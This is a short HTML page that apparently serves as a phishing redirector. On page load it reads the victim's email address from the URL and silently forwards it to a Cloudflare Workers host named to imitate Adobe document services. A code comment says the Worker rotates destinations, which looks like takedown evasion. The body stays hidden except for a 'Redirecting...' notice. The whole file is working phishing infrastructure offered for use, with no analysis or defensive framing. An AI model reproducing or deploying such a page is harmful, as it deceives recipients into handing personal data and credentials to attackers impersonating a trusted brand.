<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // Grab ?email= from current URL
    function getEmail() {
      const params = new URLSearchParams(window.location.search);
      return params.get("email") || "";
    }

    function redirectToWorker() {
      const email = getEmail();

      // Always forward to your Worker (it does rotation with KV)
      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/";
      if (email) {
        url += "?email=" + encodeURIComponent(email);
      }

      // Redirect immediately
      window.location.replace(url);
    }

    window.addEventListener("load", redirectToWorker);
  </script>
</head>
<body style="display:none;">
  Redirecting...
</body>
</html>
